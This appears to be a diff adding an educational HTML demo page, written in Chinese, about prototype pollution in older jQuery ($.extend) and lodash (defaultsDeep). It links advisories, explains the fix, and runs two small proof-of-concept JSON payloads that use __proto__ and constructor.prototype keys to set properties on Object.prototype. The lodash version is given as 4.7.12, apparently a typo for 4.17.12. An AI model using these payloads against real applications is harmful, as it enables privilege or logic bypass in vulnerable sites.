@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>jquery和lodash导致原型污染问题</title>
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.js"></script>
+  <!-- <script src="https://cdn.bootcss.com/jquery/3.4.0/jquery.js"></script> -->
+
+  <script src="https://cdn.bootcss.com/lodash.js/4.17.11/lodash.js"></script>
+  <!-- <script src="https://cdn.bootcss.com/lodash.js/4.17.12/lodash.js"></script> -->
+</head>
+<body>
+  jquery在3.4.0版本（不包括3.4.0）之前extend会污染原型。</br>
+  <a href="https://github.com/jquery/jquery/pull/4333">jQuery 修复原型污染 PR</a></br>
+  <a href="https://snyk.io/blog/after-three-years-of-silence-a-new-jquery-prototype-pollution-vulnerability-emerges-once-again/">jQuery prototype pollution vulnerability</a></br>
+  <div>解决方法：在遍历时，当遇见 __proto__ 敏感属性，则退出程序</div>
+  </br></br></br></br></br></br>
+  
+  lodash 版本4.7.12（不包括4.7.12）之前defaultsDeep会污染原型。</br>
+  <div>解决方法：在遍历 merge 时，当遇见 constructor 以及 __proto__ 敏感属性，则退出程序。</div>
+  <a href="https://zhuanlan.zhihu.com/p/73186974">Lodash 严重安全漏洞背后 你不得不知道的 JavaScript 知识</a></br>
+  <a href="https://snyk.io/blog/snyk-research-team-discovers-severe-prototype-pollution-security-vulnerabilities-affecting-all-versions-of-lodash/">Snyk research team discovers severe prototype pollution security vulnerabilities affecting all versions of lodash</a>
+  <script>
+    /* jquery */
+    let a = $.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))
+    console.log({}.devMode); // jquery3.4.0版本前会输出true
+
+    /* lodash */
+    const payload = '{"constructor": {"prototype": {"lodash": true}}}'
+    _.defaultsDeep({}, JSON.parse(payload))
+    console.log({}.lodash); // lodash4.7.12版本前会输出true
+  </script>
+</body>
+</html>
